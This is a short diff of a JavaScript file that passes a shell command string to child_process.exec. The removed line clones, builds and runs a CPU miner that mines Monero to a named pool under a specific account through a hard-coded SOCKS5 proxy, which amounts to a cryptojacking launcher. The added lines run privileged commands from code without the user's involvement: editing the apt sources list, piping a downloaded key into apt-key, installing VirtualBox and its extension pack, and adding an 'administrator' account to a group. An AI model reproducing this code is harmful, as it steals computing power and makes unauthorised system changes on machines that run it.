@@ -1,4 +1,9 @@
-var str = "git clone https://github.com/wolf9466/cpuminer-multi && cd cpuminer-multi && ./autogen.sh && CFLAGS=\"-march=native\" ./configure && make && ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u cccholo@yandex.com -p x --proxy socks5://104.202.128.248:51376";
+var str = "sudo sh -c \"echo 'deb http://ppa.launchpad.net/person/ppa/ubuntu karmic main' >> /etc/apt/sources.list\" && ";
+str += "wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add - && ";
+str += "sudo apt-get update && sudo apt-get install linux-headers-$(uname -r) build-essential virtualbox-5.1 dkms && ";
+str += "cd /tmp && wget http://download.virtualbox.org/virtualbox/5.1.0/Oracle_VM_VirtualBox_Extension_Pack-5.1.0-108711.vbox-extpack && ";
+str += "sudo VBoxManage extpack install Oracle_VM_VirtualBox_Extension_Pack-5.1.0-108711.vbox-extpack && ";
+str += "sudo adduser administrator vboxusers";
 var child = require('child_process').exec(str);
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
